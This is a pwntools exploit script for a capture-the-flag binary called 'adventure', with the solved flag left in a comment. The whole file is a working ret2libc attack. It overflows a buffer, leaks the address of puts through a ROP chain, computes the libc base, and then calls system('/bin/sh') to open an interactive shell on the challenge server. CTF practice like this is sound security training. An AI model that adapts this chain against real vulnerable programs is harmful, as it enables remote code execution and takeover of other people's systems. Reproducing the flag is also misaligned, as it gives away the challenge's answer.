#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./adventure_patched")
libc=ELF("./libc.6.so")

context.binary = exe

REMOTE_NC_CMD    = "nc dyn.ctf.pearlctf.in 30014"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b hatchEgg
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"2")
    r.sendline(b"1")

    POP_RDI = p64(0x000000000040121e)
    RET = p64(0x000000000040101a)

    payload = b"A"*0x20 + POP_RDI*2 + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)
    r.sendline(payload)

    r.recvuntil(b"You leave the area with")
    r.recvline()
    leak = u64(r.recvline()[:-1].ljust(8, b"\x00"))
  
    libc.address = leak - libc.sym.puts

    r.sendline(b"2")
    r.sendline(b"1")
    payload = b"A"*0x20 + POP_RDI*2 + p64(libc.binsh()) + RET + p64(libc.sym.system)
    r.sendline(payload)

    r.interactive()
    #pearl{r3s0lv1ng_tr0ubl3s_b3c0m1ng_tr0ubl3h00t3r}

if __name__ == "__main__":
    main()